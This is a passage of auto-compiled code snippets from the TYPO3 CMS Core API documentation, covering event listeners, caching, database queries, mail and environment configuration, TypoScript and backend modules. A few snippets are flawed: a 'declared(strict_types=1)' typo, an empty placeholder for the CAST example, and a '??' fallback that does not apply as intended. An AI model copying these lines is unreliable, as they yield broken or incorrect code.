\\TYPO3\\CMS\\Core\\Authentication\\AbstractUserAuthentication\n    {\n        // Implementation not shown\n    }\n\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface\n    {\n        // Implementation not shown\n    }\n\n    public function getRequestToken(): \\TYPO3\\CMS\\Core\\Security\\RequestToken|false|null\n    {\n        // Implementation not shown\n    }\n\n    public function setRequestToken(?\\TYPO3\\CMS\\Core\\Security\\RequestToken|false|null $requestToken): void\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP Password for TYPO3\nDESCRIPTION: This snippet sets the password for SMTP authentication. It is necessary for connecting to the SMTP server securely when the transport method is set to SMTP.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_12\n\nLANGUAGE: text\nCODE:\n```\n:Path: $GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_smtp_password']\n:type: password\n:Default: ''\n\n*only with transport=smtp* If your SMTP server requires authentication, enter your password here.\n```\n\n----------------------------------------\n\nTITLE: Implementing LoginAttemptFailedEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to create an event listener for the LoginAttemptFailedEvent in TYPO3 CMS. It shows the basic structure of the listener class and the method signature for handling the event.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Authentication/LoginAttemptFailedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Authentication\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Authentication\\Event\\LoginAttemptFailedEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(LoginAttemptFailedEvent $event): void\n    {\n        // Do something\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Environment Variables in TYPO3 Bootstrap Process\nDESCRIPTION: This PHP code snippet demonstrates how to retrieve environment variables in the TYPO3 application bootstrap process. It sets various configuration options based on the values defined in the .env file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/EnvironmentConfiguration.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\n$GLOBALS['TYPO3_CONF_VARS']['DB']['Connections']['Default']['host'] = $_ENV['TYPO3_DB_CONNECTIONS_DEFAULT_HOST'] ?? '';\n$GLOBALS['TYPO3_CONF_VARS']['DB']['Connections']['Default']['port'] = $_ENV['TYPO3_DB_CONNECTIONS_DEFAULT_PORT'] ?? 3306;\n$GLOBALS['TYPO3_CONF_VARS']['DB']['Connections']['Default']['user'] = $_ENV['TYPO3_DB_CONNECTIONS_DEFAULT_USER'] ?? '';\n$GLOBALS['TYPO3_CONF_VARS']['DB']['Connections']['Default']['password'] = $_ENV['TYPO3_DB_CONNECTIONS_DEFAULT_PASS'] ?? '';\n$GLOBALS['TYPO3_CONF_VARS']['DB']['Connections']['Default']['dbname'] = $_ENV['TYPO3_DB_CONNECTIONS_DEFAULT_NAME'] ?? '';\n\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport'] = $_ENV['TYPO3_MAIL_TRANSPORT'] ?? '';\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_smtp_server'] = $_ENV['TYPO3_MAIL_TRANSPORT_SMTP_SERVER'] ?? '';\n\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['encryptionKey'] = $_ENV['TYPO3_ENCRYPTIONKEY'] ?? '';\n```\n\n----------------------------------------\n\nTITLE: Configuring Haiku Record Link Browser with TypoScript\nDESCRIPTION: This snippet demonstrates the frontend configuration for rendering haiku record links with TypoScript, specifying the detail page and required parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/RecordLinkBrowser.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\nconfig.recordLinks.haiku {\n    // Page ID where the haiku plugin is located\n    typolink.parameter = 123\n    typolink.additionalParams.data = field:uid\n    typolink.additionalParams.wrap = &tx_examples_haiku[controller]=Haiku&tx_examples_haiku[action]=show&tx_examples_haiku[haiku]=|\n    typolink.useCacheHash = 1\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Record Count Action in TYPO3 Module Controller\nDESCRIPTION: This snippet shows a countAction method in a TYPO3 ModuleController that retrieves the count of records from a specified database table and displays it as a flash message. It demonstrates proper use of localization utilities and flash message creation with contextual feedback severity.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Controllers/PhpLocalization.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TYPO3\\CMS\\Core\\Type\\ContextualFeedbackSeverity;\nuse TYPO3\\CMS\\Extbase\\Utility\\LocalizationUtility;\n\nclass ModuleController extends ActionController\n{\n    /**\n     * Adds a count of entries to the flash message\n     */\n    public function countAction(string $tablename = 'pages'): ResponseInterface\n    {\n        $count = $this->tableInformationService->countRecords($tablename);\n\n        $message = LocalizationUtility::translate(\n            'record_count_message',\n            'examples',\n            [$count, $tablename],\n        );\n\n        $this->addFlashMessage(\n            $message ?? '',\n            'Information',\n            ContextualFeedbackSeverity::INFO,\n        );\n        return $this->redirect('flash');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Query Builder from Connection in TYPO3\nDESCRIPTION: Example of using the createQueryBuilder() method within a loop to create query builders for different table operations, saving code repetition.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Connection/Index.rst#2025-04-16_snippet_12\n\nLANGUAGE: php\nCODE:\n```\npublic function processTables(array $tables): void\n{\n    foreach ($tables as $tableName) {\n        $connectionPool = GeneralUtility::makeInstance(ConnectionPool::class);\n        $connection = $connectionPool->getConnectionForTable($tableName);\n\n        $queryBuilder = $connection->createQueryBuilder();\n        $rows = $queryBuilder\n            ->select('*')\n            ->from($tableName)\n            ->executeQuery()\n            ->fetchAllAssociative();\n        // Do something with $rows\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Cache Usage in TYPO3 PHP Class\nDESCRIPTION: Example class demonstrating cache injection and usage with get/set operations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Developer/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nnamespace MyVendor\\MyExtension;\n\nuse TYPO3\\CMS\\Core\\Cache\\Frontend\\FrontendInterface;\n\nclass MyClass\n{\n    protected FrontendInterface $cache;\n\n    public function __construct(FrontendInterface $cache)\n    {\n        $this->cache = $cache;\n    }\n\n    public function getResults(): array\n    {\n        $cacheIdentifier = 'myext_calculate_something';\n        $result = $this->cache->get($cacheIdentifier);\n        if ($result === false) {\n            $result = $this->calculateExpensiveOperation();\n            $this->cache->set($cacheIdentifier, $result);\n        }\n        return $result;\n    }\n```\n\n----------------------------------------\n\nTITLE: Automate Testing with GitHub Actions\nDESCRIPTION: This YAML configuration sets up a GitHub Actions workflow to automate test execution. It triggers on pushes, pull requests, or manual dispatches to ensure tests run automatically on every change, useful for continuous integration and test validation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Acceptance.rst#2025-04-16_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nname: tests\n\non:\n  push:\n  pull_request:\n  workflow_dispatch:\n\njobs:\n  testsuite:\n    name: all tests\n```\n\n----------------------------------------\n\nTITLE: Example of HTTP POST with User Object Update\nDESCRIPTION: Illustrates the format of an HTTP POST request when updating a user object in TYPO3 Extbase, with properties like email, password, and description, highlighting the importance of secured modifications.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesExtensionDevelopment/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: none\nCODE:\n```\n[\n   __identity => ...\n   email =>  ...\n   password => ...\n   description => ...\n],\n```\n\n----------------------------------------\n\nTITLE: Cleaning HTML Content with TYPO3 HTMLcleaner\nDESCRIPTION: This example shows how to configure and use the HTMLcleaner method to sanitize and transform HTML content. The configuration defines allowed tags, nesting rules, tag remapping, and attribute handling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ParsingHtml/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n$tagCfg = array(\n   'b' => array(\n      'nesting' => 1,\n      'remap' => 'strong',\n      'allowedAttribs' => 0\n   ),\n   'img' => array(),\n   'div' => array(),\n   'br' => array(),\n   'p' => array(\n      'fixAttrib' => array(\n         'class' => array(\n            'set' => 'bodytext'\n         )\n      )\n   )\n);\n$result = $parseObj->HTMLcleaner(\n   $testHTML,\n   $tagCfg,\n   FALSE,\n   FALSE,\n   array('xhtml' => 1)\n);\n```\n\n----------------------------------------\n\nTITLE: Receiving Broadcast Messages in TYPO3 Backend\nDESCRIPTION: Example code demonstrating how to register an event listener for broadcast messages. The event listener receives the message details in the event.detail property.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BroadcastChannels.rst#2025-04-16_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n// Register JavaScript event to listen for messages from the broadcast service\n// Format: typo3:[componentName]:[eventName]\ndocument.addEventListener('typo3:my_extension:my_event', (evt) => {\n  // Access payload of the event\n  console.log(evt.detail.greeting); // Would output \"Hello World\" in the previous example\n  console.log(evt.detail.anotherProperty); // Would output \"foobar\" in the previous example\n});\n\n```\n\n----------------------------------------\n\nTITLE: Retrieving Single Column Value with fetchOne() in TYPO3 PHP\nDESCRIPTION: Example of using fetchOne() to retrieve a single column value from a query result. This is particularly useful for COUNT queries to get the number of records.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Statement/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n// Get the number of tt_content records on pid 42 into variable $numberOfRecords\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$numberOfRecords = $queryBuilder\n    ->count('uid')\n    ->from('tt_content')\n    ->where(\n        $queryBuilder->expr()->eq(\n            'pid',\n            $queryBuilder->createNamedParameter(42, Connection::PARAM_INT)\n        )\n    )\n    ->executeQuery()\n    ->fetchOne();\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyRedirectManagementControllerViewDataEvent Event Listener in TYPO3\nDESCRIPTION: Example implementation of an event listener for the ModifyRedirectManagementControllerViewDataEvent that modifies the view data by adding custom information to page records. This demonstrates how to use this PSR-14 event to extend the redirect management interface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Redirects/ModifyRedirectManagementControllerViewDataEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Redirects\\EventListener;\n\nuse TYPO3\\CMS\\Redirects\\Event\\ModifyRedirectManagementControllerViewDataEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyRedirectManagementControllerViewDataEvent $event): void\n    {\n        // Get the current view data\n        $viewData = $event->getViewData();\n\n        // Get the currently shown page records from the view data\n        $demand = $viewData['demand'] ?? null;\n        $paginator = $viewData['paginator'] ?? null;\n        $pages = $viewData['pages'] ?? [];\n\n        // Only proceed if we have valid data\n        if ($demand !== null && $paginator !== null && !empty($pages)) {\n            // Modify page records. As an example, add dummy data\n            foreach ($pages as $identifier => $page) {\n                $pages[$identifier]['customData'] = 'My custom data for ' . $page['target'] ?? '';\n            }\n\n            // Set modified pages back to view data\n            $viewData['pages'] = $pages;\n\n            // Update the view data\n            $event->setViewData($viewData);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Complete Translated Template Example\nDESCRIPTION: Full example showing a template with all static text replaced by translation ViewHelpers\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Fluid.rst#2025-04-16_snippet_5\n\nLANGUAGE: HTML\nCODE:\n```\n<h3>{post.title}</h3>\n<p><f:translate key=\"authorPrefix\"> {post.author.fullName}</p>\n<p>{post.content -> f:format.nl2br()}</p>\n<h3><f:translate key=\"commentHeader\"></h3>\n<f:for each=\"{post.comments}\" as=\"comment\">\n   {comment.content -> f:format.nl2br()}\n   <hr>\n</f:for>\n```\n\n----------------------------------------\n\nTITLE: Configuring a Non-Extbase Plugin in TypoScript\nDESCRIPTION: Demonstrates how to configure a non-Extbase plugin using TypoScript with USER or USER_INT objects. This approaches uses a plain PHP class as controller instead of using the Extbase framework.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: TypoScript\nCODE:\n```\ntt_content.my_plugin = USER\ntt_content.my_plugin {\n    userFunc = Vendor\\MyExtension\\Controller\\PluginController->main\n    # These settings are available in the PHP class:\n    someSettings = foo\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Driver Middleware with UsableForConnectionInterface\nDESCRIPTION: Demonstrates how to register a custom Doctrine DBAL driver middleware that implements UsableForConnectionInterface for conditional application based on connection parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Middleware/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['DB']['globalMiddlewares'] = array_merge(\n    $GLOBALS['TYPO3_CONF_VARS']['DB']['globalMiddlewares'] ?? [],\n    [\n        'my-custom-middleware' => [\n            'target' => \\Vendor\\Extension\\DoctrineDBAL\\CustomMiddleware::class,\n            'after' => ['typo3/core/custom-platform-driver-middleware'],\n        ],\n    ]\n);\n```\n\n----------------------------------------\n\nTITLE: Implementing AJAX Response in TYPO3 BlogController\nDESCRIPTION: Controller action method that converts a Blog model object to JSON format and returns it as an HTTP response. Uses PSR-7 ResponseInterface for standardized HTTP response handling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/View/JsonResponseCustom.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse T3docs\\BlogExample\\Domain\\Model\\Blog;\n\nclass BlogController extends AbstractController\n{\n    public function showBlogAjaxAction(Blog $blog): ResponseInterface\n    {\n        $jsonOutput = json_encode($blog);\n        return $this->jsonResponse($jsonOutput);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring an Extbase Plugin in TYPO3\nDESCRIPTION: Demonstrates how to configure an Extbase plugin in the file ext_localconf.php using ExtensionUtility::configurePlugin(). This registers the plugin for the frontend and defines which controller actions should be available.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nExtensionUtility::configurePlugin(\n    // extension name (matching the composer name but without vendor)\n    'MyExtension',\n    // arbitrary but unique plugin name (used in TypoScript, Fluid etc.)\n    'Pi1',\n    // Array of controller classname => list of actions\n    [\n        \\Vendor\\MyExtension\\Controller\\MyPluginController::class =>\n            'list, show',\n    ],\n    // non-cacheable controller action names\n    [\n        \\Vendor\\MyExtension\\Controller\\MyPluginController::class =>\n            'create, update, delete',\n    ],\n    // default plugin type is \n    // \\TYPO3\\CMS\\Extbase\\Utility\\ExtensionUtility::PLUGIN_TYPE_PLUGIN\n);\n```\n\n----------------------------------------\n\nTITLE: Setting WebP Quality for Image Generation\nDESCRIPTION: This configuration allows users to specify the quality for WebP images in TYPO3, with options for numeric quality or 'lossless' compression. This is key for optimizing image file sizes without sacrificing quality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/GFX.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['GFX']['webp_quality'] = 85;\n```\n\n----------------------------------------\n\nTITLE: Configuring XCLASS Service Injection in TYPO3 CMS (YAML)\nDESCRIPTION: This YAML configuration example shows how to set up a reference for an extended class using XCLASS in TYPO3 CMS. It ensures that the extended class is used for dependency injection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_18\n\nLANGUAGE: YAML\nCODE:\n```\nTYPO3\\CMS\\Belog\\Controller\\BackendLogController: '@MyVendor\\MyExtension\\Controller\\ExtendedBackendLogController'\n```\n\n----------------------------------------\n\nTITLE: Adding a DropDown Divider to TYPO3 Dropdown Button\nDESCRIPTION: This snippet demonstrates how to add a divider element to a dropdown button in TYPO3 backend. The divider serves as a visual separator between dropdown items.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/ButtonComponents.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Backend\\Template\\Components\\Buttons\\DropDown\\DropDownDivider;\n\n$item = GeneralUtility::makeInstance(DropDownDivider::class);\n$dropDownButton->addItem($item);\n```\n\n----------------------------------------\n\nTITLE: TYPO3 PageArguments Class Method Definitions\nDESCRIPTION: Collection of method signatures for the PageArguments class, including methods for retrieving page IDs, arguments, and handling array offsets. This class is responsible for managing resolved parameters from page path segments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/PageArguments.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Routing;\n\nclass PageArguments {\n    public function areDirty(): bool\n    public function getRouteArguments(): array\n    public function getPageId(): int\n    public function getPageType(): string\n    public function get(string $name): string|array|null\n    public function getArguments(): array\n    public function getStaticArguments(): array\n    public function getDynamicArguments(): array\n    public function getQueryArguments(): array\n    public function offsetExists(?mixed $offset): bool\n    public function offsetGet(?mixed $offset): string|array|null\n    public function offsetSet(?mixed $offset, ?mixed $value): void\n    public function offsetUnset(?mixed $offset): void\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Up Site Configuration in YAML for TYPO3 Distribution Packages\nDESCRIPTION: This code represents the path structure for including site configuration YAML files in a distribution package. Files placed at this location will be imported upon installation of the distribution. The <SITE_IDENTIFIER> should be replaced with the actual site identifier.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/CreateNewDistribution.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nInitialisation/Site/<SITE_IDENTIFIER>/config.yaml\n```\n\n----------------------------------------\n\nTITLE: Implementing POST Request with TYPO3 RequestFactory\nDESCRIPTION: Example of making a POST request using TYPO3's RequestFactory with form parameters or raw body data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/RestRequests/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$additionalOptions = [\n    'body' => 'Your raw post data',\n    // OR form data:\n    'form_params' => [\n        'first_name' => 'Jane',\n        'last_name' => 'Doe',\n    ]\n];\n\n$response = $this->requestFactory->request($url, 'POST', $additionalOptions);\n```\n\n----------------------------------------\n\nTITLE: Implementation of htmlResponse Method in TYPO3 Extbase ActionController\nDESCRIPTION: The implementation of the htmlResponse method in the ActionController class, which creates an HTTP response with rendered HTML content. It demonstrates how to create a proper HTTP response object with content from the view.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/Controller.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\nprotected function htmlResponse(string $html = null): ResponseInterface\n{\n    $html = $html ?? $this->view->render();\n    $response = $this->responseFactory->createResponse()\n        ->withHeader('Content-Type', 'text/html; charset=utf-8');\n    $response->getBody()->write($html);\n    return $response;\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Toplevel Module in TYPO3 CMS Backend\nDESCRIPTION: This code demonstrates how to register a new toplevel module in a TYPO3 extension using the Configuration/Backend/Modules.php file. The example defines module properties including localization labels, icon identifier, and navigation component.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleConfiguration/ToplevelModules.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nreturn [\n    'myextension' => [\n        'labels' => 'LLL:EXT:my_extension/Resources/Private/Language/locallang_mod_web.xlf',\n        'iconIdentifier' => 'modulegroup-myextension',\n        'navigationComponent' => '@typo3/backend/page-tree/page-tree-element',\n    ]\n];\n```\n\n----------------------------------------\n\nTITLE: Evaluating Custom Permission Options in TYPO3\nDESCRIPTION: Example code showing how to check if a custom permission option is set in a TYPO3 extension. It uses the BE_USER object to verify if the user has the specified permission.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/CustomPermissions.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['BE_USER']->check('custom_options', $catKey . ':' . $itemKey);\n```\n\n----------------------------------------\n\nTITLE: URI Builder in Extbase Controller\nDESCRIPTION: This snippet demonstrates how to use the URI builder within an Extbase controller.  The URI builder is automatically available as a property in controller classes that extend `extbase-action-controller`. The request context is automatically available to the UriBuilder.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/UriBuilder.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\"<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\\\MyExtension\\\\Controller;\n\nuse TYPO3\\\\CMS\\\\Extbase\\\\Mvc\\\\Controller\\\\ActionController;\n\nclass MyController extends ActionController\n{\n    /**\n     * @return void\n     */\n    public function listAction(): void\n    {\n        $uri = $this->uriBuilder\n            ->reset()\n            ->setTarget('show')\n            ->setArguments(['foo' => 'bar'])\n            ->setControllerName('My')\n            ->setExtensionName('MyExtension')\n            ->setPluginName('Pi1')\n            ->build();\n        $this->view->assign('uri', $uri);\n    }\n}\n\"\n```\n\n----------------------------------------\n\nTITLE: Using Expression Builder CAST to Integer in PHP\nDESCRIPTION: Shows how to use ExpressionBuilder::castInt() to convert a value, row field value or expression result to signed integer type.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: PHP\nCODE:\n```\n// Code snippet not provided in the text\n```\n\n----------------------------------------\n\nTITLE: Configuring Default Mail Sender in PHP\nDESCRIPTION: Sets up the default email sender address and name in the TYPO3 configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_16\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['defaultMailFromAddress'] = 'john.doe@example.org';\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['defaultMailFromName'] = 'John Doe';\n```\n\n----------------------------------------\n\nTITLE: Defining Basic Cache Configuration in TYPO3 Extension\nDESCRIPTION: Example of how an extension should define a new cache with minimal configuration in its ext_localconf.php file. This lets the system use default frontend and backend settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Configuration/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclared(strict_types=1);\n\n// Add a new cache for myext extension\nif (!isset($GLOBALS['TYPO3_CONF_VARS']['SYS']['caching']['cacheConfigurations']['myext'])) {\n    $GLOBALS['TYPO3_CONF_VARS']['SYS']['caching']['cacheConfigurations']['myext'] = [];\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing TYPO3 Backend Controller with Module Template\nDESCRIPTION: Implementation of a Backend Controller class that extends ActionController to handle TYPO3 backend module functionality. The code demonstrates initialization of module templates and modification of doc header components including menus, buttons and meta information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/_ModifyDocHeaderComponent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse TYPO3\\CMS\\Backend\\Template\\ModuleTemplate;\n\nclass BackendController extends ActionController\n{\n    private function modifyDocHeaderComponent(ModuleTemplate $view, string &$context): void\n    {\n        $menu = $this->buildMenu($view, $context);\n        $view->getDocHeaderComponent()->getMenuRegistry()->addMenu($menu);\n\n        $buttonBar = $view->getDocHeaderComponent()->getButtonBar();\n        $this->addButtons($buttonBar);\n\n        $metaInformation = $this->getMetaInformation();\n        if (is_array($metaInformation)) {\n            $view->getDocHeaderComponent()->setMetaInformation($metaInformation);\n        }\n    }\n\n    protected function initializeModuleTemplate(\n        ServerRequestInterface $request,\n    ): ModuleTemplate {\n        $view = $this->moduleTemplateFactory->create($request);\n\n        $context = '';\n        $this->modifyDocHeaderComponent($view, $context);\n        $view->setFlashMessageQueue($this->getFlashMessageQueue());\n        $view->setTitle(\n            $this->getLanguageService()->sL('LLL:EXT:blog_example/Resources/Private/Language/Module/locallang_mod.xlf:mlang_tabs_tab'),\n            $context,\n        );\n\n        return $view;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring TCA foreign_table_where with Site Parameters in TYPO3\nDESCRIPTION: Example showing how to use site configuration markers in TCA foreign_table_where to filter categories based on rootPageId and custom category PID settings. The query demonstrates accessing both direct site config values and nested array values.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/UseSiteInTCA.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n// ...\n'fieldConfiguration' => [\n    'foreign_table_where' => ' AND ({#sys_category}.uid = ###SITE:rootPageId### OR {#sys_category}.pid = ###SITE:mySetting.categoryPid###) ORDER BY sys_category.title ASC',\n],\n// ...\n```\n\n----------------------------------------\n\nTITLE: Configuring 'ssl_key' in TYPO3\nDESCRIPTION: This snippet demonstrates configuring the 'ssl_key' option for HTTP requests in TYPO3. This option specifies the path to a local certificate and an optional passphrase for SSL/TLS connections. It is used for specifying a private key to be used with the certificate.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/HTTP.rst#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['HTTP']['ssl_key']\"\n```\n\n----------------------------------------\n\nTITLE: Accessing FlexForm Data in TypoScript\nDESCRIPTION: Shows how to read FlexForm properties from TypoScript using the 'flexform' key followed by the field name and property path.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/Index.rst#2025-04-16_snippet_12\n\nLANGUAGE: typoscript\nCODE:\n```\nlib.flexformContent = CONTENT\nlib.flexformContent {\n    table = tt_content\n    select {\n        pidInList = this\n    }\n\n    renderObj = COA\n    renderObj {\n        10 = TEXT\n        10 {\n            data = flexform: pi_flexform:settings.categories\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Backend Layout in Frontend with FLUIDTEMPLATE in TYPO3\nDESCRIPTION: TypoScript configuration to use backend layouts in the frontend via FLUIDTEMPLATE. This code maps the pagelayout data to specific template files based on the selected backend layout.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendLayout.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\npage.10 = FLUIDTEMPLATE\npage.10 {\n  file.stdWrap.cObject = CASE\n  file.stdWrap.cObject {\n\tkey.data = pagelayout\n\n\tdefault = TEXT\n\tdefault.value = EXT:sitepackage/Resources/Private/Templates/Home.html\n\n\t3 = TEXT\n\t3.value = EXT:sitepackage/Resources/Private/Templates/1-col.html\n\n\t4 = TEXT\n\t4.value = EXT:sitepackage/Resources/Private/Templates/2-col.html\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving All Link Handlers in TYPO3 CMS\nDESCRIPTION: This method returns an array of all link handlers and their configurations. It's part of the ModifyLinkHandlersEvent class in TYPO3 CMS.\nSOURCE: 